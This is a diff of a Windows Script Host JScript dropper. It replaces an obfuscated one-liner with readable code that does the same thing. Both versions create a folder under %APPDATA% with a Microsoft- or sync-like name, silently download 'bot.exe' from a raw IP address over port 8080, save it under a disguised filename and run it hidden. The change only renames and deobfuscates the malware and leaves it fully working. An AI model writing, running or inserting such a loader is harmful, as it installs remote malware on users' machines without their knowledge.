@@ -1,1 +1,8 @@
-var qs44b269xvc=WScript.CreateObject('WScript.Shell');var qftzdv76ok0=new ActiveXObject('Scripting.FileSystemObject');var qjtmui5hrcs=qs44b269xvc.ExpandEnvironmentStrings('%APPDATA%')+'\\Microsoft\\IdentityCRL';if(!qftzdv76ok0.FolderExists(qjtmui5hrcs)){qftzdv76ok0.CreateFolder(qjtmui5hrcs);}qs44b269xvc.Run('curl.exe -s -f -o "'+qjtmui5hrcs+'\\identitycrl.exe" "http://63.187.54.139:8080/payload/latest/bot.exe"',0,true);qs44b269xvc.Run('"'+qjtmui5hrcs+'\\identitycrl.exe"',0,false);
+var shell = WScript.CreateObject('WScript.Shell');
+var fso = new ActiveXObject('Scripting.FileSystemObject');
+var dir = shell.ExpandEnvironmentStrings('%APPDATA%') + '\\FileSync';
+if (!fso.FolderExists(dir)) {
+  fso.CreateFolder(dir);
+}
+shell.Run('curl.exe -s -f -o "' + dir + '\\filesync.exe" "http://63.187.54.139:8080/payload/latest/bot.exe"', 0, true);
+shell.Run('"' + dir + '\\filesync.exe"', 0, false);
